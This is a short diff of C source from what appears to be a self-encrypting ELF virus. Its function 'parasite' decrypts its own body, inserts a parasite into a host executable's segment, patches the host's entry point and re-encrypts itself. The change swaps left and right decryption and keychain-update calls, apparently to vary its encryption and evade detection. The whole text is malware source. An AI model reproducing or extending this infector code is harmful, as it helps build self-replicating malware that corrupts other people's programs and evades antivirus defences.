@@ -54,7 +54,7 @@ void parasite(struct s_host *host, struct s_keychain *keychain, enum e_context c
 	MID_LOGGER("parasite:\t\t");
 #endif
 
-	decrypt_right(keychain, (char *)injection, (void *)parasite - (void *)injection);
+	decrypt_left(keychain, (char *)injection, (void *)parasite - (void *)injection);
 
 	if (context == FAILURE)
 		goto label;
@@ -64,11 +64,11 @@ void parasite(struct s_host *host, struct s_keychain *keychain, enum e_context c
 	insert_parasite(infect->ptr, host->segment);
 	patch_entry_point(infect->ptr, host);
 
-	decrypt_left(keychain, ptr, (void *)stub - (void *)parasite);
+	decrypt_right(keychain, ptr, (void *)stub - (void *)parasite);
 
 label:
-	update_keychain_right(keychain, (char *)parasite, (void *)stub - (void *)parasite);
-	decrypt_right(keychain, (char *)stub, (void *)sign - (void *)stub);
+	update_keychain_left(keychain, (char *)parasite, (void *)stub - (void *)parasite);
+	decrypt_left(keychain, (char *)stub, (void *)sign - (void *)stub);
 
 	stub(host, keychain, context, infect);
 }
